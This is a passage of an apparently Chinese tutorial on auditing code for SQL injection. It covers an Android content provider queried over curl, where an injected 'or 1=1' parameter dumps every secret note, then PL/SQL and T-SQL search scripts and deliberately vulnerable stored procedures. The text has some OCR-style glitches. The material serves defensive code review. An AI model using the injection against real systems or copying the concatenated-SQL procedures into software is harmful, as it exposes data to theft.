class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token string\">\"%\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>selectionArgs<span class=\"token operator\">!=</span><span class=\"token keyword\">null</span> <span class=\"token operator\">&amp;&amp;</span> selectionArgs<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\nselectionArgs <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"%\"</span> <span class=\"token operator\">+</span>selectionArgs <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"%\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">//将内部字段映射到SearchManager理解的字段</span>\nqBuilder<span class=\"token punctuation\">.</span><span class=\"token function\">setProjectionMap</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NOTE_PROJECTION_MAP</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">SQLiteDatabase</span> db <span class=\"token operator\">=</span> dbHelper<span class=\"token punctuation\">.</span><span class=\"token function\">getReadableDatabase</span><span class=\"token punctuation\">(</span>〉；\n<span class=\"token comment\">//执行査询</span>\n<span class=\"token class-name\">Cursor</span> c <span class=\"token operator\">=</span> qBuilder<span class=\"token punctuation\">.</span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">,</span> projection<span class=\"token punctuation\">,</span> selection<span class=\"token punctuation\">,</span> selectionArgs<span class=\"token punctuation\">,</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> sortOrder<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">return</span> c<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>WebContentResolver向所有己经安装的内容提供程序(Content-Provider)暴露了一个Web Service接口。可以用WebContentResolver实用工具列出所有可访问的内容提供程序。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">curl</span> http://127.0.0.1:8080/list\npackage: org.sapmentors.sapnoteview\nauthority: org.sapmentors.sapnoteview.noteprovider\nexported: <span class=\"token boolean\">true</span>\nreadPerm: null\nwritePerm: null<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>执行查询</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">curl</span> http://127.0.0.1:8080/query?a<span class=\"token operator\">=</span>org.sapmentors.sapnoteview.noteprovider?<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">selName</span><span class=\"token operator\">=</span>_id<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">seiId</span><span class=\"token operator\">=</span><span class=\"token number\">11223</span>\nQuery successful:\nColumn count: <span class=\"token number\">3</span>\nRow count: <span class=\"token number\">1</span>\nI\t_id <span class=\"token operator\">|</span> suggest_text_l <span class=\"token operator\">|</span> suggest_intent_data\nI <span class=\"token number\">11223</span> <span class=\"token operator\">|</span> secret text 丨 <span class=\"token number\">11223</span>\n\n<span class=\"token comment\">#实际SQL语句</span>\n<span class=\"token comment\">#SELECT _id, title AS suggest_text_l, _id AS suggest_intent_data FROM notes WHERE (_id=11223)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>执行注入</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token variable\">$curl</span> http://127.0.0.1:8080/query?a<span class=\"token operator\">=</span>org.sapmentors.sapnoteview, noteprovider?<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">selName</span><span class=\"token operator\">=</span>_id<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">selId</span><span class=\"token operator\">=</span>l1223%20or%201<span class=\"token operator\">=</span><span class=\"token number\">1</span>\nQuery successful:\nColumn count: <span class=\"token number\">3</span>\nRow count: <span class=\"token number\">4</span>\n<span class=\"token operator\">|</span> _id <span class=\"token operator\">|</span> suggest_text_l <span class=\"token operator\">|</span>suggest_intent_data\n<span class=\"token operator\">|</span> <span class=\"token number\">11223</span> <span class=\"token operator\">|</span> secret text <span class=\"token operator\">|</span> <span class=\"token number\">11223</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">12345</span> <span class=\"token operator\">|</span> secret text <span class=\"token operator\">|</span> <span class=\"token number\">12345</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">54321</span> <span class=\"token operator\">|</span> super secret text <span class=\"token operator\">|</span> <span class=\"token number\">54321</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">98765</span> <span class=\"token operator\">|</span> shhhh secret <span class=\"token operator\">|</span> <span class=\"token number\">98765</span>\n\n<span class=\"token comment\">#实际SQL语句</span>\n<span class=\"token comment\">#SELECT _id, title AS suggest_text_l, _id AS suggest_intent_data FROM notes WHERE (_id=11223 or 1=1)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>selName和selId这两个参数易感染，存在SQL注入</p>\n<h4 id=\"复查PL-SQL和T-SQL代码\"><a href=\"#复查PL-SQL和T-SQL代码\" class=\"headerlink\" title=\"复查PL/SQL和T-SQL代码\"></a>复查PL/SQL和T-SQL代码</h4><h5 id=\"PL-SQL\"><a href=\"#PL-SQL\" class=\"headerlink\" title=\"PL/SQL\"></a>PL/SQL</h5><p>Oracle一直深受多种PL/SQL注入漏洞的困扰，这些漏洞位于数据库产品默认安装的内置数据库包的代码中。PL/SQL代码以definer权限执行，是提升权限的攻击者攻击对象。</p>\n<p>存储过程既能够以调用者权限(authid current_user)运行，也能够以存储过程所有者权限 (authid definer)运行。创建存储过程时，可以使用authid子句指定该行为。</p>\n<p>要分析PL/SQL有两种选择</p>\n<h6 id=\"一种是将源代码从数据库导出来\"><a href=\"#一种是将源代码从数据库导出来\" class=\"headerlink\" title=\"一种是将源代码从数据库导出来\"></a>一种是将源代码从数据库导出来</h6><p>可以使用dbms_metadata包实现该目标，可以使用下面SQL*Plus脚本将DDL(Data Definition Language,数据定义语言)语句从Oracle数据库导出来。DDL语句是定义或修改数据结构(比如 表)的SQL语句。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">-- Purpose: A PL/SQL script to export the DDL code for all database objects ——Version: v 0.0.1</span>\n<span class=\"token comment\">-- Works against: Oracle 9i, lOg and llg</span>\n<span class=\"token comment\">-- Author: Alexander Kornbrust of Red-Database-Security GmbH</span>\n<span class=\"token keyword\">set</span> echo <span class=\"token keyword\">off</span> feed <span class=\"token keyword\">off</span> pages <span class=\"token number\">0</span> trims <span class=\"token keyword\">on</span> term <span class=\"token keyword\">on</span> trim <span class=\"token keyword\">on</span> linesize <span class=\"token number\">255</span> long <span class=\"token number\">500000</span> head <span class=\"token keyword\">off</span>\n<span class=\"token comment\">--</span>\n<span class=\"token keyword\">execute</span> DBMS_METADATA<span class=\"token punctuation\">.</span>SET_TRANSFORM_PARAM<span class=\"token punctuation\">(</span>DBMS_METADATA<span class=\"token punctuation\">.</span>SESSION_\nTRANSFORM<span class=\"token punctuation\">,</span> <span class=\"token string\">'STORAGE'</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nspool getallunwrapped<span class=\"token punctuation\">.</span><span class=\"token keyword\">sql</span>\n<span class=\"token keyword\">select</span> <span class=\"token string\">'spool ddl_source_unwrapped.txt'</span> <span class=\"token keyword\">from</span> dual<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- create a SQL scripts containing all unwrapped objects</span>\n<span class=\"token keyword\">select</span> <span class=\"token string\">'select dbms_metadata.get_ddl('''</span><span class=\"token operator\">||</span>object_type<span class=\"token operator\">||</span><span class=\"token string\">''','''</span><span class=\"token operator\">||</span>object_name<span class=\"token operator\">||</span><span class=\"token string\">''','''</span><span class=\"token operator\">||</span>owner<span class=\"token operator\">||</span><span class=\"token string\">''') from dual;'</span>\n<span class=\"token keyword\">from</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> all_objects <span class=\"token keyword\">where</span> object_id <span class=\"token operator\">not</span> <span class=\"token operator\">in</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> o<span class=\"token punctuation\">.</span>obj<span class=\"token comment\"># from source$ s, obj$ o,user$ u where ((lower(s.source) like '%function%wrapped%') or (lower (s.source) like '%procedure%wrapped%') or (lower(s.source) like '%package%wrapped%')) and o.obj#=s .obj# and u.user#=o.owner#)) where object_type in ('FUNCTION',\t'PROCEDURE', 'PACKAGE', 'TRIGGER')</span>\n<span class=\"token operator\">and</span> owner <span class=\"token operator\">in</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'SYS'</span><span class=\"token punctuation\">)</span> \n<span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> owner<span class=\"token punctuation\">,</span>object_type<span class=\"token punctuation\">,</span>object_name<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- spool a spool off into the spool file.</span>\n<span class=\"token keyword\">select</span> <span class=\"token string\">'spool off'</span> <span class=\"token keyword\">from</span> dual<span class=\"token punctuation\">;</span>\nspool <span class=\"token keyword\">off</span>\n<span class=\"token comment\">--</span>\n<span class=\"token comment\">-- generate the DDL_source</span>\n<span class=\"token variable\">@getallunwrapped.sql</span>\nquit<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h6 id=\"另一种是构造自己的SQL语句来搜索PL-SQL代码\"><a href=\"#另一种是构造自己的SQL语句来搜索PL-SQL代码\" class=\"headerlink\" title=\"另一种是构造自己的SQL语句来搜索PL/SQL代码\"></a>另一种是构造自己的SQL语句来搜索PL/SQL代码</h6><p>Oracle在 ALL_SOURCE和DBA_SOURCE视图中存储PL/SQL源代码。可以通过访问两个视图之一的TEXT列实现该目的。最值得关注的是使用了execute immediate或dbms sql函数的代码。Oracle的PL/SQL是区分大小写的，一定要在查询中使用lower(text)函数，它会将文本值转换为小写字母以便LIKE语句能匹配所有可能的情况。</p>\n<p>使用下列SQL语句来获取PL/SQL代码的源</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> owner <span class=\"token keyword\">AS</span> Owner<span class=\"token punctuation\">,</span> name <span class=\"token keyword\">AS</span> Name<span class=\"token punctuation\">,</span> <span class=\"token keyword\">type</span> <span class=\"token keyword\">AS</span> <span class=\"token keyword\">Type</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">text</span> <span class=\"token keyword\">AS</span> Source <span class=\"token keyword\">FROM</span> dba_source <span class=\"token keyword\">WHERE</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>LOWER<span class=\"token punctuation\">(</span>Source<span class=\"token punctuation\">)</span> <span class=\"token operator\">LIKE</span> <span class=\"token string\">'%immediate%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">OR</span> <span class=\"token punctuation\">(</span>LOWER<span class=\"token punctuation\">(</span>Source<span class=\"token punctuation\">)</span> <span class=\"token operator\">LIKE</span> <span class=\"token string\">'%dbms_sql'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">AND</span> owner<span class=\"token operator\">=</span> <span class=\"token string\">'PLSQL'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/840f9086a329bf41df56550583bdcb36.png\"></p>\n<p>这三条语句易受到攻击，未验证的参数传给了危险的函数</p>\n<p>寻找参数复制给局部定义的变量</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> owner <span class=\"token keyword\">AS</span> Owner<span class=\"token punctuation\">,</span> name <span class=\"token keyword\">AS</span> Name<span class=\"token punctuation\">,</span> <span class=\"token keyword\">type</span> <span class=\"token keyword\">AS</span> <span class=\"token keyword\">Type</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">text</span> <span class=\"token keyword\">AS</span> Source <span class=\"token keyword\">FROM</span> dba_source <span class=\"token keyword\">where</span> lower<span class=\"token punctuation\">(</span>Source<span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%:=%||%''%'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/d4fd03c14a6b885f11cfe09069f46727.png\"></p>\n<p>上述SQL语句找到了一个利用用户控制的数据动态创建SQL语句的包。我们有必要对该包做进一步审查，可以使用下列SQL语句追溯包(package)的源以便进一步审查其内容</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">text</span> <span class=\"token keyword\">AS</span> Source <span class=\"token keyword\">FROM</span> dba_source <span class=\"token keyword\">WHERE</span> name<span class=\"token operator\">=</span><span class=\"token string\">'SP_STORED_PROCEDURE'</span> <span class=\"token operator\">AND</span> owner<span class=\"token operator\">=</span><span class=\"token string\">'SYSMAN'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> line<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/268e43e5f0121d8c4c2fc627816da7d0.png\"></p>\n<p>input直接与SQL字符串相连，可以判断存在SQL注入</p>\n<p>搜索数据库中所有的代码</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">-- Purpose: A PL/SQL script to search the DB for potentially vulnerable </span>\n<span class=\"token comment\">-- PL/SQL code</span>\n—<span class=\"token operator\">-</span> Version: v <span class=\"token number\">0.0</span><span class=\"token number\">.1</span>\n<span class=\"token comment\">-- Works against: Oracle 9i, 10g and llg</span>\n——Author: Alexander Kornbrust <span class=\"token keyword\">of</span> Red<span class=\"token operator\">-</span><span class=\"token keyword\">Database</span><span class=\"token operator\">-</span>Security GmbH\n<span class=\"token keyword\">select</span> <span class=\"token keyword\">distinct</span> a<span class=\"token punctuation\">.</span>owner<span class=\"token punctuation\">,</span>a•name<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">.</span>authid<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">.</span><span class=\"token keyword\">text</span> SQLTEXT <span class=\"token keyword\">from</span> all_source a<span class=\"token punctuation\">,</span>all_procedures b\n<span class=\"token keyword\">where</span> <span class=\"token punctuation\">(</span>\nlower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%execute%immediate%(%||%)%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%dbms_sql%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%grant%to%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%alter%user%identified%by%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%execute%immediate%''%||%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%dbms_%utility.exec_ddl_statement%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%dbms_ddl.create_wrapped%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%dbms_hs_pass_through.execute_immediate%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%dbms_hs_passthrough.parse%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%owa_util.bind_variables%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%owa_util.listprint%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%owa_ util.tableprint%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%dbms_sys_sq1.%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%ltadm.execsql%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%dbms_prvtaqim.execute_stmt%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%dbms_streams_rpc.execute_stmt%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%dbms_aqadm_sys.execute_stmt%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%dbms_streams_adm_utl.execute_ sql_ string%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%initjvmaux.exec%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%dbms_repcat_sql_utl.do_sql%'</span>\n<span class=\"token operator\">or</span> lower<span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">like</span> <span class=\"token string\">'%dbms_aqadm_syscalls.kwqa3_gl_executestmt%'</span>\n<span class=\"token operator\">and</span> lower<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">not</span> <span class=\"token operator\">like</span> <span class=\"token string\">'% wrapped%'</span> <span class=\"token operator\">and</span> a<span class=\"token punctuation\">.</span>owner<span class=\"token operator\">=</span>b<span class=\"token punctuation\">.</span>owner <span class=\"token operator\">and</span> a<span class=\"token punctuation\">.</span>name<span class=\"token operator\">=</span>b<span class=\"token punctuation\">.</span>obj ect_name <span class=\"token operator\">and</span> a<span class=\"token punctuation\">.</span>owner <span class=\"token operator\">not</span> <span class=\"token operator\">in</span>\n<span class=\"token punctuation\">(</span><span class=\"token string\">'OLAPSYS'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'ORACLE_OCM'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'CTXSYS'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'OUTLN'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'SYSTEM'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'EXFSYS'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'MDSYS'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'SYS'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'SYSMAN'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'WKSYS'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'XDB'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'FLOWS_040000'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'FLOWS_030000'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'FLOWS_030100'</span><span class=\"token punctuation\">,</span>\t<span class=\"token string\">'FLOWS_020000'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'FLOWS_020100'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'FLOWS020000'</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'FLOWS_010600'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'FLOWS_010500'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'FLOWS_010400'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"T-SQL\"><a href=\"#T-SQL\" class=\"headerlink\" title=\"T-SQL\"></a>T-SQL</h5><p>sp_helptext存储过程会显示用于在多行中创建对象的定义。每一行均包含了 T-SQL 定义的255个字符。该定义位于sys.sql_modules目录视图的definition列中。</p>\n<p>一个储存过程源代码</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">EXEC</span> sp_helptext SP_StoredProcedure<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">PROCEDURE</span> SP_StoredProcedure <span class=\"token variable\">@input</span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">NULL</span> <span class=\"token keyword\">AS</span> <span class=\"token keyword\">DECLARE</span> <span class=\"token variable\">@sql</span> nvarchar<span class=\"token punctuation\">(</span><span class=\"token number\">4000</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token variable\">@sql</span> <span class=\"token operator\">=</span> <span class=\"token string\">'SELECT field FROM table WHERE field ='''</span><span class=\"token operator\">+</span> <span class=\"token variable\">@input</span> <span class=\"token operator\">+</span> <span class=\"token string\">''''</span> \n<span class=\"token keyword\">EXEC</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">@sql</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看到@input变量来自用户直接输入与SQL字符串相连，产生SQL注入</p>\n<p>使用sp_executesql和EXEC()两条命令来调用动态SQL，sp_executesql是一个内置存储过程，接收两个预定义的参数和任意多个用户定义参数。第一个参数@stmt是强制参数，包含一条或一批 SQL语句。在SQL 7和SQL 2000中，@stmt的数据类型是ntext,在SQL Server 2005及之后 的版本中是nvarchar(MAX)。第二个参数@params是可选参数。EXEC()接收一个参数，该参数是一条要执行的SQL语句。它可以由字符串变量和字符串常量连接而成。</p>\n<p>下面是一个使用了 sp_executesql存储过程且易受到攻击的存储过程示例</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">EXEC</span> sp_helptext SP_StoredProcedure_II<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">PROCEDURE</span> SP_StoredProcedure_II <span class=\"token punctuation\">(</span><span class=\"token variable\">@input</span> nvarchar<span class=\"token punctuation\">(</span><span class=\"token number\">25</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">AS</span>\n<span class=\"token keyword\">DECLARE</span> <span class=\"token variable\">@sql</span> nvarchar<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">SET</span> <span class=\"token variable\">@sql</span> <span class=\"token operator\">=</span> <span class=\"token string\">'SELECT field FROM table WHERE field ='''</span><span class=\"token operator\">+</span> <span class=\"token variable\">@input</span> <span class=\"token operator\">+</span><span class=\"token string\">''''</span> \n<span class=\"token keyword\">EXEC</span> sp_executesql <span class=\"token variable\">@sql</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>列出所有储存过程</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> name <span class=\"token keyword\">FROM</span> dbo<span class=\"token punctuation\">.</span>sysobjects <span class=\"token keyword\">WHERE</span> <span class=\"token keyword\">type</span> <span class=\"token operator\">=</span><span class=\"token string\">'P'</span> <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> name <span class=\"token keyword\">asc</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>利用脚本找到所有储存过程</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">-- Description: A T-SQL script to search the DB for potentially vulnerable </span>\n<span class=\"token comment\">-- T-SQL code</span>\n<span class=\"token comment\">-- @text - search string '%text%'</span>\n<span class=\"token comment\">-- @dbname - database name, by default all databases will be searched</span>\n<span class=\"token keyword\">ALTER</span> <span class=\"token keyword\">PROCEDURE</span> <span class=\"token punctuation\">[</span>dbo<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">[</span>grep_sp<span class=\"token punctuation\">]</span><span class=\"token variable\">@text</span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">250</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token variable\">@dbname</span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">null</span>\n<span class=\"token keyword\">AS</span> <span class=\"token keyword\">BEGIN</span>\n<span class=\"token keyword\">SET</span> NOCOUNT <span class=\"token keyword\">ON</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token variable\">@dbname</span> <span class=\"token operator\">is</span> <span class=\"token boolean\">null</span>\n<span class=\"token keyword\">begin</span>\n<span class=\"token comment\">-- enumerate all databases.</span>\n<span class=\"token keyword\">DECLARE</span> <span class=\"token comment\">#db CURSOR FOR Select Name from master...sysdatabases declare 0c_dbname varchar(64)</span>\n<span class=\"token keyword\">OPEN</span> <span class=\"token comment\">#db FETCH #db INTO @c_dbname</span>\n<span class=\"token keyword\">while</span> @<span class=\"token variable\">@FETCH_STATUS</span> <span class=\"token operator\">&lt;&gt;</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span>\n<span class=\"token keyword\">begin</span>\n<span class=\"token keyword\">execute</span> grep_sp <span class=\"token variable\">@text</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">@c_dbname</span>\n<span class=\"token keyword\">FETCH</span> <span class=\"token comment\">#db INTO @c_dbname</span>\n<span class=\"token keyword\">end</span>\n<span class=\"token keyword\">CLOSE</span> <span class=\"token comment\">#db DEALLOCATE #db</span>\n<span class=\"token keyword\">end</span>\n<span class=\"token keyword\">else</span>\n<span class=\"token keyword\">begin</span>\n<span class=\"token 